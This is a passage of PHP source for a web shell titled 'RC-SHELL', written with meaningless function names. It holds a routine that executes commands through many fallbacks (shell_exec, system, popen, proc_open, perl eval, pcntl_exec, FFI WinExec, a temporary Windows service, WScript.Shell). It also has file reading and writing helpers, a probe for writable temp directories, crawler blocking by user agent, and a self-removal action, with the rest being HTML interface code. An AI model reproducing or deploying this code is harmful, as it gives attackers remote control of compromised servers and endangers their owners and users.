    return @isset($a[$i]) ? $a[$i] : '';
}
function z9s()
{
    if (@isset($_SERVER['HTTP_USER_AGENT'])) {
        if (@preg_match('/' . @implode('|', z7z(3, "agents")) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
            @header(z7z(3, "send_header"));
            exit(0);
        }
    }
}
z9s();
function z9y($k, $w = '', $u = 0)
{
    global $lang;
    $l = z7z(2, "language");
    $r = '';
    if (!isset($lang[$l][$k]))
        return "?";
    $r = $lang[$l][$k];
    if ($w !== '') {
        if (@is_array($w)) {
            for ($i = 0; $i < @count($w); $i++) {
                if (@isset($w[$i]))
                    $r = @str_replace("[%" . ($i + 1) . "%]", $w[$i], $r);
            }
        } else {
            $r = @str_replace("[%1%]", $w, $r);
        }
    }
    return ($u ? @strtoupper($r) : $r);
}
function z9p()
{
    $o = '';
    if (@defined('PHP_OS')) {
        $o = PHP_OS;
    } elseif (@function_exists('php_uname') && @is_callable('php_uname')) {
        $o = @php_uname('s');
    }
    return !@empty($o) ? $o : "*NIX";
}
function z6v()
{
    $i = @get_included_files();
    return (@count($i) > 0) ? ($i[0] != __file__) : 0;
}
function z9a($d, $s = ':')
{
    if ($d != '') {
        if (!@strstr($d, $s))
            return array($d);
        return @array_map('trim', @explode($s, $d));
    }
    return array();
}
function z9i($i)
{
    foreach (array(
        "a" => "4",
        "e" => "3",
        "o" => "0",
        "s" => "5",
        "l" => "1",
        "t" => "7") as $k => $v) {
        $i = @str_replace(array($k, @strtoupper($k)), $v, $i);
    }
    return $i;
}
function z3n()
{
    $wwwdir = false;
    if (@isset($_SERVER["SCRIPT_NAME"])) {
        $sn = z1j($_SERVER["SCRIPT_NAME"]);
        if (@realpath($sn)) {
            $sp = z1j(@realpath($sn));
        } else {
            $sp = z1j(@realpath(__file__));
        }
        $wwwdir = z1k(@substr($sp, 0, @strpos($sp, $sn)));
    }
    return $wwwdir;
}
function z6j()
{
    global $win;
    $s = '/';
    $tmp = array();
    $tp = array();
    $tn = array(
        '/tmp/',
        '/dev/shm/',
        '/var/tmp/');
    $tw = array("%WINDIR/temp/");
    $ti = array(@ini_get('session.save_path'), @ini_get('upload_tmp_dir'));
    $te = array(
        'TMP',
        'TMPDIR',
        'TEMP');
    if ($win) {
        foreach ($tw as $t)
            $tp[] = $t;
    } else {
        foreach ($tn as $t)
            $tp[] = $t;
    }
    if (@isset($_ENV)) {
        foreach ($te as $t) {
            if (!@empty($_ENV[$t]))
                $tp[] = @realpath($_ENV[$t]);
        }
    }
    foreach ($ti as $t) {
        if (!@empty($t))
            $tp[] = $t;
    }
    $b = z9a(@ini_get('open_basedir'));
    if (@count($b) > 0) {
        foreach ($b as $t) {
            if (!empty($t))
                $tp[] = $t;
        }
    }
    $tp[] = @realpath(@dirname(__file__));
    for ($i = 0; $i < @count($tp); $i++) {
        if (!@empty($tp[$i])) {
            $p = @str_replace('\\', $s, $tp[$i]);
            if (@substr($p, -1, 1) != $s) {
                $p .= $s;
            }
            if (!@in_array($p, $tmp)) {
                $f = @md5(@uniqid(@time()));
                $fp = @fopen($p . $f, "w");
                if ($fp) {
                    @fclose($fp);
                    if (@file_exists($p . $f)) {
                        @unlink($p . $f);
                        $tmp[] = @trim($p);
                    }
                }
            }
        }
    }
    return (@count($tmp) > 0) ? $tmp : array("./");
}
function z9o($f)
{
    global $nix, $sh_exec;
    $r = '';
    if (z7e('fopen') && z7e('feof') && z7e('fgets') && z7e('feof') && z7e('fclose') &&
        ($fp = @fopen($f, 'r')) !== false) {
        while (!@feof($fp)) {
            $r .= @fgets($fp);
        }
        ;
        @fclose($fp);
    } elseif (z7e('fopen') && z7e('fread') && z7e('fclose') && z7e('filesize') && ($fp =
    @fopen($f, 'r')) !== false) {
        $r = @fread($fp, @filesize($f));
        @fclose($fp);
    } elseif ($nix && $sh_exec) {
        $r = z9e('cat "' . $f . '" 2>/dev/null', 0);
    } elseif (z7e('file') && ($fl = @file($f))) {
        foreach ($fl as $l) {
            $r .= $l;
        }
    } elseif (z7e('file_get_contents')) {
        $r = @file_get_contents($f);
    } elseif (z7e('readfile')) {
        $r = @readfile($f);
    } elseif (z7e('highlight_file')) {
        $r = @highlight_file($f);
    } elseif (z7e('show_source')) {
        $r = @show_source($f);
    }
    return $r;
}
function z9u($f, $t = '')
{
    global $tempdir;
    $s = '';
    if (!$t)
        $t = @tempnam($tempdir, "copytemp");
    if (@copy("compress.zlib://" . $f, $t)) {
        $s = z9o($t);
        @unlink($t);
    }
    return $s;
}
function z9t($t, $s = '')
{
    if (z7e('fopen') && z7e('fwrite') && z7e('fclose') && ($f = @fopen($t, "wb"))
        !== false) {
        @fwrite($f, $s);
        @fclose($f);
    } elseif (z7e('fopen') && z7e('fputs') && z7e('fclose') && ($f = @fopen($t, "wb"))
    !== false) {
        @fputs($f, $s);
        @fclose($f);
    } elseif (z7e('file_put_contents')) {
        return @file_put_contents($t, $s);
    } else {
        return 0;
    }
    return 1;
}
function z7e($f)
{
    return (@function_exists($f) && @is_callable($f) && !@in_array($f, z6h())) ? 1 :
        0;
}
function z3x($v)
{
    if ($v == '')
        return 'no value';
    if (@is_bool($v))
        return $value ? 'TRUE' : 'FALSE';
    if ($v === null)
        return 'NULL';
    if (@is_object($v))
        $v = (array )$v;
    if (@is_array($v)) {
        @ob_start();
        print_r($v);
        $v = @ob_get_contents();
        @ob_end_clean();
    }
    return (string )$v;
}
function z6k($i)
{
    return (z7e('escapeshellarg')) ? @escapeshellarg($i) : $i;
}
function z9e($c, $h = 1)
{
    $r = '';
    if (!empty($c)) {
        if (z7e('shell_exec')) {
            $r = @shell_exec($c);
        } elseif (z7e('system')) {
            @ob_start();
            @system($c);
            $r = @ob_get_contents();
            @ob_end_clean();
        } elseif (z7e('passthru')) {
            @ob_start();
            @passthru($c);
            $r = @ob_get_contents();
            @ob_end_clean();
        } elseif (z7e('exec')) {
            @exec($c, $r);
            $r = @join("\n", $r);
        } elseif (z7e('popen') && @is_resource($f = @popen($c, "r"))) {
            if (z7e('fread') && z7e('feof')) {
                while (!@feof($f)) {
                    $r .= @fread($f, 1024);
                }
            } elseif (z7e('fgets') && z7e('feof')) {
                while (!@feof($f)) {
                    $r .= @fgets($f, 1024);
                }
            }
            @pclose($f);
        } elseif (z7e('proc_open') && @is_resource($f = @proc_open($c, array(1 => array("pipe",
                "w")), $p))) {
            if (z7e('fread') && z7e('feof')) {
                while (!@feof($p[1])) {
                    $r .= @fread($p[1], 1024);
                }
            } elseif (z7e('fgets') && z7e('feof')) {
                while (!@feof($p[1])) {
                    $r .= @fgets($p[1], 1024);
                }
            }
            @proc_close($f);
        }
    } else {
        $r = z6c($c);
    }
    return ($h ? @htmlspecialchars($r) : $r);
}
function z6c($c)
{
    global $win, $tempdir;
    $r = '';
    if (!empty($c)) {
        if (!$win) {
            if (extension_loaded('perl')) {
                @ob_start();
                $p = new perl();
                $p->eval("system('$c')");
                $r = @ob_get_contents();
                @ob_end_clean();
            } elseif (z7e('pcntl_exec') && z7e('pcntl_fork')) {
                $r = '[~] Blind Command Execution via [pcntl_exec]\n\n';
                $o = $tempdir . uniqid('pcntl');
                $pid = @pcntl_fork();
                if ($pid == -1) {
                    $r .= '[-] Could not fork. Exit';
                } elseif ($pid) {
                    $r .= (@pcntl_wifexited($status) ? '[+] Done! Command "' . $c .
                        '" successfully executed.' : '[-] Error. Incorrect Command.');
                } else {
                    $c = array(" -e 'system(\"$c > $o\")'");
                    if (@pcntl_exec('/usr/bin/perl', $c))
                        exit(0);
                    if (@pcntl_exec('/usr/local/bin/perl', $c))
                        exit(0);
                    die();
                }
                $r = z9o($o);
                @unlink($o);
            }
        } else {
            $o = $tempdir . uniqid('NJ');
            if (extension_loaded('ffi')) {
                $a = new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
                $r = $a->WinExec("cmd.exe /c " . z6k($c) . " >\"$o\"", 0);
                while (!@file_exists($o))
                    sleep(1);
                $r = z9o($o);
            } elseif (extension_loaded('win32service')) {
                $s = uniqid('NJ');
                @win32_create_service(array(
                    'service' => $s,
                    'display' => $s,
                    'path' => 'c:\\windows\\system32\\cmd.exe',
                    'params' => "/c " . z6k($c) . " >\"$o\""));
                @win32_start_service($s);
                @win32_stop_service($s);
                @win32_delete_service($s);
                while (!@file_exists($o))
                    sleep(1);
                $r = z9o($o);
            } elseif (extension_loaded("win32std")) {
                @win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c ' .
                    z6k($c) . ' > "' . $o . '"');
                while (!@file_exists($o))
                    sleep(1);
                $r = z9o($o);
            } else {
                $a = new COM("WScript.Shell");
                $a->Run('c:\\windows\\system32\\cmd.exe /c ' . z6k($c) . ' > "' . $o . '"');
                $r = z9o($o);
            }
            @unlink($o);
        }
    }
    return $r;
}
function z10e()
{
    list($u, $s) = @explode(" ", @microtime());
    return ((float)$u + (float)$s);
}
function z4m($c, $i)
{
    $a = array(
        '0' => array(
            'container',
            'login',
            'footer',
            'headnfo',
            'ql',
            'nav',
            'sinfo',
            'tfilter',
            'tahex',
            'phpinfo'),
        '1' => array('list1', 'list2'),
        '2' => array(
            'lerror',
            'topcf',
            'topt',
            'topc',
            'tdfooter',
            'tdql',
            'tdsinfo',
            'tdlsh1',
            'tdlsh2',
            'tdlsf',
            'tdlsfn',
            'tdfilter',
            'tdhead',
            'tdph',
            'tdpl',
            'tdlbl',
            'thex1',
            'thex2',
            'thex3',
            'tdlsf1',
            'tdmail'),
        '3' => array(
            "scroll",
            "selector",
            "divls",
            "dwidth",
            "barbg",
            "barfil"),
        '4' => array(
            'size1',
            'size2',
            'size3',
            'size4',
            'size5',
            'size6',
            'size7',
            'size8',
            'size9',
            'size10'),
        '5' => array(
            'links',
            'slinks',
            'button',
            'head',
            'ql1',
            'ql2',
            'but1',
            'but2',
            'but3',
            'fimg',
            'dirlist',
            'filelist',
            'ftactive',
            'ftcompat',
            'ftother',
            'qlback',
            'mbut1',
            'mbut2',
            'actbut'),
        '6' => array(
            'console',
            'tgeneric',
            'tedit',
            'txmail',
            'tsql1',
            'tsql2',
            'tinj'),
        );
    return (@isset($a[$i][$c]) ? $a[$i][$c] : '');
}
function z7w($a = '', $c = '', $s = '')
{
    return '<table cellpadding="0" cellspacing="0" border="0"' . (($a != '') ?
        ' align="' . $a . '"' : '') . (($c != '') ? ' class="' . z4m($c, '0') . '"' : '') . (($s !=
        '') ? z10r($s) : '') . '>' . "\n";
}
function z9m($c = '', $s = '')
{
    return z7w('', $c, $s);
}
function z7r($c = '', $s = '')
{
    return z7w('left', $c, $s);
}
function z7d($c = '', $s = '')
{
    return z7w('right', $c, $s);
}
function z7g($c = '', $s = '')
{
    return z7w('center', $c, $s);
}
function z10q()
{
    return '</table>' . "\n";
}
function z10w($i, $c = '', $s = '')
{
    return z9m($c, $s) . $i . z10q();
}
function z7h($i, $c = '', $s = '')
{
    return z7r($c, $s) . $i . z10q();
}
function z7s($i, $c = '', $s = '')
{
    return z7d($c, $s) . $i . z10q();
}
function z7a($i, $c = '', $s = '')
{
    return z7g($c, $s) . $i . z10q();
}
function z7y()
{
    return '</tr>' . "\n";
}
function z6d($v, $c = '', $id = '')
{
    return '<tr valign="' . $v . '"' . (($id != '') ? ' id="' . $id . '"' : '') . (($c !=
        '') ? ' class="' . z4m($c, '1') . '"' : '') . '>' . "\n";
}
function z7t($i, $v, $c = '', $id = '')
{
    return z6d($v, $c, $id) . $i . z7y();
}
function z9d($i, $c = '', $id = '')
{
    return z7t($i, "top", $c, $id);
}
function z7u($i, $c = '', $id = '')
{
    return z7t($i, "middle", $c, $id);
}
function z7p($i, $c = '', $id = '')
{
    return z7t($i, "bottom", $c, $id);
}
function z7o($c = '', $id = '')
{
    return z6d("top", $c, $id);
}
function z6f($c = '', $id = '')
{
    return z6d("middle", $c, $id);
}
function z5c($c = '', $id = '')
{
    return z6d("bottom", $c, $id);
}
function z5b()
{
    return z9d(z9c('&nbsp;'));
}
function z6s()
{
    return z10w(z5b());
}
function z5z($a = '', $c = '', $s = '')
{
    return '<div' . (($a != '') ? ' align="' . $a . '"' : '') . (($c != '') ?
        ' class="' . z4m($c, '3') . '"' : '') . (($s != '') ? z10r($s) : '') . '>';
}
function z5h()
{
    return '</div>';
}
function z5k($a = '', $c = '', $s = '')
{
    return '<td' . (($a != '') ? ' align="' . $a . '"' : '') . (($c != '') ?
        ' class="' . z4m($c, '2') . '"' : '') . (($s != '') ? z10r($s) : '') . '>' . "\n";
}
function z7j($c = '', $s = '')
{
    return z5k('', $c, $s);
}
function z5l($c = '', $s = '')
{
    return z5k('left', $c, $s);
}
function z5m($c = '', $s = '')
{
    return z5k('right', $c, $s);
}
function z6q($c = '', $s = '')
{
    return z5k('center', $c, $s);
}
function z4c($a = '', $n, $c = '', $s = '')
{
    return '<td colspan="' . $n . '"' . (($a != '') ? ' align="' . $a . '"' : '') . (($c !=
        '') ? ' class="' . z4m($c, '2') . '"' : '') . (($s != '') ? z10r($s) : '') . '>' .
        "\n";
}
function z6i($n, $c = '', $s = '')
{
    return z4c('', $n, $c, $s);
}
function z4k($n, $c = '', $s = '')
{
    return z4c('left', $n, $c, $s);
}
function z4l($n, $c = '', $s = '')
{
    return z4c('right', $n, $c, $s);
}
function z4z($n, $c = '', $s = '')
{
    return z4c('center', $n, $c, $s);
}
function z7f()
{
    return '</td>' . "\n";
}
function z9c($i, $c = '', $s = '')
{
    return z7j($c, $s) . $i . z7f();
}
function z7k($i, $c = '', $s = '')
{
    return z5l($c, $s) . $i . z7f();
}
function z6z($i, $c = '', $s = '')
{
    return z5m($c, $s) . $i . z7f();
}
function z6l($i, $c = '', $s = '')
{
    return z6q($c, $s) . $i . z7f();
}
function z6x($i, $n, $c = '', $s = '')
{
    return z6i($n, $c, $s) . $i . z7f();
}
function z6y($i, $n, $c = '', $s = '')
{
    return z4k($n, $c, $s) . $i . z7f();
}
function z6e($i, $n, $c = '', $s = '')
{
    return z4l($n, $c, $s) . $i . z7f();
}
function z6r($i, $n, $c = '', $s = '')
{
    return z4z($n, $c, $s) . $i . z7f();
}
function z5w($n = '', $c, $r = 0, $w = '', $h = '')
{
    return '<textarea' . ($n != '' ? ' id="' . $n . '" name="' . $n . '"' : '') .
        ' class="' . z4m($c, '6') . '"' . (($w != '' || $h != '') ? ' style="' . ($w !=
        '' ? 'width:' . $w . 'px;' : '') . ($h != '' ? 'height:' . $h . 'px;' : '') .
        '"' : '') . ($r ? ' readonly' : '') . '>';
}
function z5q()
{
    return '</textarea>';
}
function z9k($t = '', $n = '')
{
    return '<form method="POST" action=""' . (($t != '') ? ' target="_blank"' : '') . (($n !=
        '') ? ' name="' . $n . '" id="' . $n . '"' : '') . '>';
}
function z6b($c = '', $t = '')
{
    return '<form method="POST" action=""' . (($t != '') ? ' target="_blank"' : '') . (($c !=
        '') ? ' class="' . z4m($c, '3') . '"' : '') . '>';
}
function z7l()
{
    return '<form method="POST" action="" enctype="multipart/form-data">';
}
function z7i($u, $t = '', $m = 'GET')
{
    return '<form method="' . $m . '" action="' . $u . '"' . (($t != '') ?
        ' target="_blank"' : '') . '>';
}
function z9l()
{
    return '</form>';
}
function z10r($i)
{
    $u = array();
    if (!@is_numeric($i))
        return '';
    $a = array(
        'border-top:0;',
        'border-bottom:0;',
        'border-left:0;',
        'border-right:0;',
        'width: 50%;',
        'width: 33%;',
        'border-left: 1px solid #DDDDDD;',
        'text-align: right !important;',
        'width: 150px !important;',
        'margin-left: 0 !important;');
    $r = '';
    if (@strlen($i) > 1) {
        for ($n = 0; $n < @strlen($i); $n++) {
            $c = $i[$n];
            if (@isset($a[$c]) && !@isset($u[$c])) {
                $r .= $a[$c];
                $u[$c] = '';
            }
        }
    } else {
        if (@isset($a[$i]))
            $r .= $a[$i];
    }
    return ($r != '') ? ' style="' . $r . '"' : $r;
}
function z8z($i)
{
    return (@is_bool($i) ? (($i) ? '1' : '0') : $i);
}
function z9z($n = 1)
{
    return @str_repeat("<br>", $n);
}
function z9x($n = 1)
{
    return @str_repeat("&nbsp;", $n);
}
function z6t($t, $c = '')
{
    return '<span class="' . $c . '">' . $t . '</span>';
}
function z4y($t)
{
    return z6t($t, "nw");
}
function z8k($t)
{
    return z6t($t, "nr");
}
function z5p($t)
{
    return z6t($t, "rw");
}
function z9j()
{
    return ' onfocus="this.select();" onmouseover="this.select();" onmouseout="this.select();"';
}
function z4t($n, $v)
{
    global ${$n};
    return '<input type="radio" name="' . $n . '" value="' . $v . '"' . ((@isset(${
        $n}) && ${$n} == $v) ? ' checked' : '') . '>';
}
function z9f($n, $v = '1', $o = '', $i = '')
{
    global ${$n};
    return '<input type="checkbox" id="' . $i . '" name="' . $n . '" value="' . $v .
        '" style="vertical-align: middle;"' . (($o == '') ? ((${$n} == $v) ? ' checked' :
        '') : (($o) ? ' checked' : '')) . '>';
}
function z6w($f, $t)
{
    return '<label for="' . $f . '">' . $t . '</label>';
}
function z5u($i, $t, $n, $v = '1', $o = '')
{
    return z9f($n, $v, $o, $i) . z6w($i, $t);
}
function z9g($n, $c = '', $s = '')
{
    return '<input type="file" name="' . $n . '" id="' . $n . '"' . (($c != '') ?
        ' class="' . z4m($c, '4') . '"' : '') . (($s != '') ? z10r($s) : '') . '>';
}
function z8g($v, $c = '', $o = '')
{
    return '<input type="text" value="' . z8z($v) . '"' . (($c != '') ? ' class="' .
        z4m($c, '4') . '"' : '') . (($o != '') ? z9j() : '') . '>';
}
function z6u($n, $v, $c = '', $o = '', $s = '')
{
    return '<input type="text" name="' . $n . '" value="' . z8z($v) . '"' . (($c !=
        '') ? ' class="' . z4m($c, '4') . '"' : '') . ($s != '' ? ' ' . (@is_numeric($s) ?
        z10r($s) : $s) : '') . (($o != '') ? z9j() : '') . '>';
}
function z5y($n, $v, $c = '', $o = '', $s = '')
{
    global ${$n};
    return '<input type="text" name="' . $n . '" value="' . ((@isset(${$n}) && !@
        empty(${$n})) ? ${$n} : ((@isset($_SESSION[$n])) ? $_SESSION[$n] : z8z($v))) .
        '"' . (($c != '') ? ' class="' . z4m($c, '4') . '"' : '') . ($s != '' ? ' ' . (@
        is_numeric($s) ? z10r($s) : $s) : '') . (($o != '') ? z9j() : '') . '>';
}
function z6p($n, $v, $c = '', $o = '')
{
    return '<input type="password" name="' . $n . '" value="' . z8z($v) . '"' . (($c !=
        '') ? ' class="' . z4m($c, '4') . '"' : '') . (($o != '') ? z9j() : '') . '>';
}
function z5e($n, $v, $c = '', $o = '')
{
    global ${$n};
    return '<input type="password" name="' . $n . '" value="' . ((@isset(${$n}) && !
        @empty(${$n})) ? ${$n} : z8z($v)) . '"' . (($c != '') ? ' class="' . z4m($c, '4') .
        '"' : '') . (($o != '') ? z9j() : '') . '>';
}
function z6o($n, $i, $c = '', $s = '')
{
    return '<input type="submit" ' . ($n != '' ? ' name="' . $n . '"' : '') .
        'value="' . z8z($i) . '"' . (($c != '') ? ' class="' . z4m($c, '5') . '"' : '') . (($s !=
        '') ? (@is_numeric($s) ? z10r($s) : $s) : '') . '>';
}
function z8b($i, $c = '', $s = '')
{
    return z6o('', $i, $c, $s);
}
function z1s($t, $i, $a, $c = '')
{
    return '<input type="' . $t . '" value="' . $i . '" ' . ($t == 'submit' ?
        'onsubmit' : 'onclick') . '="' . $a . '"' . (($c != '') ? ' class="' . z4m($c,
        '5') . '"' : '') . '>';
}
function z8v($i, $a, $c = '')
{
    return z1s('submit', $i, $a, $c);
}
function z8m($i, $a, $c = '')
{
    return z1s('button', $i, $a, $c);
}
function z8h($i, $a = '', $c = '', $e = '')
{
    global $use_images;
    return ($use_images ? '<input type="image" src="?act=i&amp;img=' . $i . (($e !=
        '') ? '&amp;exe=1' : '') . '" value="' . $a . '" alt="' . $a . '"' . (($c != '') ?
        ' class="' . z4m($c, '5') . '"' : '') . '>' : z1x(($i == 'small_dir' || $i ==
        'small_home' ? 'd' : 'f')));
}
function z2c($ip)
{
    $ip = @preg_replace('/[\t\s\r\n]/', '', $ip);
    if (!@is_numeric(@str_replace(".", "", $ip)) || @substr_count($ip, ".") != 3) {
        return "failed";
    } else {
        $octets = @explode(".", $ip);
        $dec = ($octets[0] * 1 << 24) + ($octets[1] * 1 << 16) + ($octets[2] * 1 << 8) + ($octets[3]);
        return $dec;
    }
}
function z2z($ip)
{
    $ip = @preg_replace('/[\t\s\r\n]/', '', $ip);
    if (!@is_numeric(@str_replace(".", "", $ip)) || @substr_count($ip, ".") != 3) {
        return "failed";
    } else {
        $dec = z2c($ip);
        $hex = "0x" . @dechex($dec);
        return $hex;
    }
}
function z1u($ip, $oct = "")
{
    $ip = @preg_replace('/[\t\s\r\n]/', '', $ip);
    if (!@is_numeric(@str_replace(".", "", $ip)) || @substr_count($ip, ".") != 3) {
        return "failed";
    } else {
        $octets = @explode(".", $ip);
        for ($i = 0; $i < 4; $i++) {
            $decoct = @decoct($octets[$i]);
            $len = @strlen($decoct);
            $leading = (9 - $len);
            $oct .= @str_repeat("0", $leading) . $decoct . ".";
        }
        $oct = @substr($oct, 0, @strlen($oct) - 1);
        return $oct;
    }
}
function z9v($n, $v = null)
{
    global ${$n};
    return '<input type="hidden" name="' . $n . '" value="' . (($v == null) ? ((@
        isset(${$n}) && !@empty(${$n})) ? ${$n} : '') : z8z($v)) . '"' . '>';
}
function z7m($n, $v = null)
{
    global ${$n};
    return '<input type="hidden" name="' . $n . '" value="' . (($v == null) ? ((@
        isset(${$n}) && !@empty(${$n})) ? ${$n} : ((@isset($_SESSION[$n])) ? $_SESSION[$n] :
        '')) : z8z($v)) . '"' . '>';
}
function z5j()
{
    return (z7e('get_current_user') && @get_current_user() != '') ? @
        get_current_user() : 'Unknown';
}
function z2a($a = array())
{
    $r = '';
    foreach ($a as $k => $v) {
        $r .= (@is_numeric($k) ? z9v($v) : z9v($k, $v));
    }
    return $r;
}
function z8f($n, $v = null)
{
    global ${$n};
    return (($v == null) ? ((@isset(${$n}) && !@empty(${$n})) ? ${$n} : '') : z8z($v));
}
function z2x($a = array())
{
    if (@isset($a['backf']))
        return z2a($a);
    $r = '';
    foreach ($a as $k => $v) {
        $r .= (@is_numeric($k) ? $v . '=' . @urlencode(z8f($v)) : $k . '=' . @urlencode
            (z8f($k, $v))) . '&';
    }
    if ($r != '')
        $r = z9v('merged', @base64_encode($r));
    return $r;
}
function z8q($a, $t = '', $u = 0)
{
    return ($u ? z7l() : z9k($t)) . z2x($a);
}
function z5x($a, $i, $t = '')
{
    return z8q($a, $t) . $i . z9l();
}
function z5n($a, $i)
{
    return z8q($a, '', 1) . $i . z9l();
}
function z7n($i)
{
    return '<span style="font-size: 9px; color: #333333; font-weight: bold;">' . $i .
        '&nbsp; </span>';
}
function z5t($i)
{
    return z6z((!@empty($i) ? z7n($i) : $i), '15');
}
function z5v($l, $i)
{
    return z6l(z7n($l) . $i, '1');
}
function z10t($h, $n, $c = '', $t = '')
{
    return '<a href="' . $h . '"' . (($c != '') ? ' class="' . z4m($c, '5') . '"' :
        '') . (($t != '') ? ' target="_blank"' : '') . '>' . $n . '</a>';
}
function z6a($f)
{
    global $nix, $sh_exec;
    $m = '';
    if (z7e('md5_file') && @md5_file($f) !== false) {
        $m = @md5_file($f);
    } elseif ($nix && $sh_exec) {
        $m = z9e('md5sum "' . $f . '"', 0);
        if (@strstr($m, ' '))
            $m = @substr($m, 0, @strpos($m, ' '));
    }
    return (@strlen($m) == 32) ? $m : false;
}
function z3c()
{
    global $linux, $saddr, $dtotal, $dfree, $bsafe, $bopendir, $bmysql, $bmssql, $boracle,
        $bpostgres, $bcurl, $use_images;
    $a = @explode(" ", @getenv("SERVER_SOFTWARE"));
    $b = @explode("-", @phpversion());
    if (@isset($a[0])) {
        $www = $a[0];
    } else {
        $www = "Unknown";
    }
    $www .= z9x(1) . z5x(array('act' => 'phpinfo', 'd'), z8b("PHP/" . $b[0], '0'));
    echo z10w(z7u(z7k(z7i('http://whois.domaintools.com/' . $saddr, '1', 'POST') .
        z8b(z9y("4"), '0') . z9l() . z9x(5) . z7i('http://www.domaintools.com/research/traceroute/?query=' .
        $saddr, '1', 'POST') . z8b(z9y("5"), "0") . z9l(), '6', '5') . z6z(z5x(array('act' =>
            'selfremove', 'd'), z8b(z9y("6"), '0')) . z9x(5) . z5x(array('act' => 'logout',
            'd'), z8b(z9y("7"), '0')), '6', '5')), '6');
    echo z10w(z7u(z6l(z9y("8"), '2', '2') . (($linux) ? z6l(z9y("9"), '2') : '') .
        z6l(z9y("1"), '2') . z6l(z9y("10"), '2') . z6l(z9y("11"), '2') . z6l(z9y("12"),
        '2') . z6l(z9y("13"), '2') . z6l(z9y("14"), '2') . z6l(z9y("15"), '2') . z6l(z9y
        ("16"), '2') . z6l(z9y("17"), '2') . z6l(z9y("18"), '2')) . z7u(z6l(z9p(), '3',
        '2') . (($linux) ? z6l(@php_uname('r'), '3') : '') . z6l(z5j(), '3') . z6l($dtotal .
        ' / ' . $dfree, '3') . z6l($www, '3') . z6l(($bsafe ? z6t(z9y("19"), 'nr') : z6t
        (z9y("20"), 'rw')), '3') . z6l(($bopendir ? z6t(z9y("21"), 'nr') : z6t(z9y("424"),
        'rw')), '3') . z6l(($bcurl ? z6t(z9y("21"), 'rw') : z9y("22")), '3') . z6l(($bmysql ?
        z6t(z9y("21"), 'rw') : z9y("22")), '3') . z6l(($bmssql ? z6t(z9y("21"), 'rw') :
        z9y("22")), '3') . z6l(($boracle ? z6t(z9y("21"), 'rw') : z9y("22")), '3') . z6l
        (($bpostgres ? z6t(z9y("21"), 'rw') : z9y("22")), '3')), '3');
}
function z3z($login = 0)
{
    global $act, $use_images, $sh_exec, $safe_exec, $ft, $nogradient;
    echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html">
' . ($use_images ? '<link rel="shortcut icon" href="?act=i&amp;img=exe">' : '') .
        '
' . ((!$login) ? '<title>[ RC-SHELL v' . z7z('0') . (!@empty($_SERVER["SERVER_NAME"]) ?
        ' - ' . $_SERVER["SERVER_NAME"] : '') . (!@empty($_SERVER["SERVER_ADDR"]) ?
        ' - ' . $_SERVER["SERVER_ADDR"] : '') . ' ]</title>' : '<title>' . z9y("0") .
        '</title>') . '
<style type="text/css">
body, table, tr, td, div, select, input, textarea, pre, code { font: 100% ' .
        z9q("fontfam") . '; text-decoration: none; }
td, div { max-width: ' . z7z('5', "width") . 'px; }
input, select, textarea { border: 0; padding: 0; }
input, select, textarea { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; -ms-box-sizing: border-box; }
input::-moz-focus-inner { border: 0;padding: 0; }
body { background-color: ' . z9q("bodybg") . '; font-family: ' . z9q("fontfam") .
        ' !important; font-size: 10px !important; color: ' . z9q("fontcolor") . ';}
*:focus {outline: none;}
.but1, .but2, .but3, .actbut, .but1:active, .but2:active, .but3:active .actbut:active { border: 1px solid #cccccc; margin-left: 1px; text-shadow: 1px 1px 2px #ffffff; vertical-align: middle; }
.but1, .but2, .but3, .actbut { ' . z2y("#F5F5F5", "#E0E0E0") . ' }
.but1:hover, .but2:hover, .but3:hover, .actbut:hover { ' . z2y("#E0E0E0",
        "#F5F5F5") . ' cursor: pointer; }
.but1 { width: 28px; height: 18px; font-size: 10px; font-weight: bold; }
.but2 { color: #4F4F4F; padding: 0 10px 0 10px; height: 20px; font-size: 10px; }
.actbut { color: #4F4F4F; padding: 0 10px 0 10px; height: 18px; font-size: 10px; font-weight: normal; }
' . (($login) ? '
.login { background: ' . z9q("tablebg") . '; border: 1px solid ' . z9q("tableborder") .
        '; -moz-box-shadow: ' . z9q("tableshadow") .
        ' 0 0 8px; -webkit-box-shadow: 0 0 8px ' . z9q("tableshadow") .
        '; box-shadow: 0 0 8px ' . z9q("tableshadow") .
        '; margin-top: 150px; padding: 10px; text-align: left; }
.login td { padding: 0; }
.login input {  background-color: #FFFFFF; border: 1px solid #CCCCCC; color: #333333; margin: 1px; margin-right: 0; height:20px; width:150px; font-size: 10px; text-shadow: 1px 1px 5px #dddddd; vertical-align: middle; }
.lerror { color: ' . z9q('errcolor') . '; padding-bottom: 10px !important; }
' : '
.container { background: ' . z9q("tablebg") . '; width: ' . z7z('5', "width") .
        'px; border: 1px solid ' . z9q("tableborder") . '; -moz-box-shadow: ' . z9q("tableshadow") .
        ' 0 0 8px; -webkit-box-shadow: 0 0 8px ' . z9q("tableshadow") .
        '; box-shadow: 0 0 8px ' . z9q("tableshadow") . '; }
form { display: inline; }
label { display: inline-block; vertical-align: baseline; }
a { text-decoration: none; }
.links, .links:active, .links:visited { background-color: transparent; color: ' .
        z9q("tlinkcolor") . '; text-shadow: 1px 1px 3px ' . z9q("tlinkshadow") .
        '; padding: 0; font-size: 10px; font-weight:normal; vertical-align: middle; vertical-align: inherit !important; }
.links:hover { color: ' . z9q("tlinkcolorhover") . '; cursor: pointer; }
.slinks { background-color: transparent; color: ' . z9q('dircolor') .
        '; font-size: 11px; font-weight: normal; }
.slinks:hover { cursor: pointer; }
.sinfo { width: 100%; }
.tdsinfo { ' . z2y(z9q("tbarbg1"), z9q("tbarbg2")) .
        ' border-bottom: 1px solid ' . z9q("tbarborderb") . '; border-top: 1px solid ' .
        z9q("tbarbordert") . '; padding: 4px; }
.tdsinfo .links { font-size: 9px; }
.tdsinfo span { vertical-align: middle; }
.topcf { vertical-align: middle; }
.topt { ' . z2y(z9q("topbg1"), z9q("topbg2")) . ' border-top: 1px solid ' . z9q
        ("topborder1") . '; color: ' . z9q("topcolor") . '; text-shadow: 1px 1px 5px ' .
        z9q("topshadow") . '; padding-top: 10px; font-size: 9px; font-weight: bold; vertical-align: middle; }
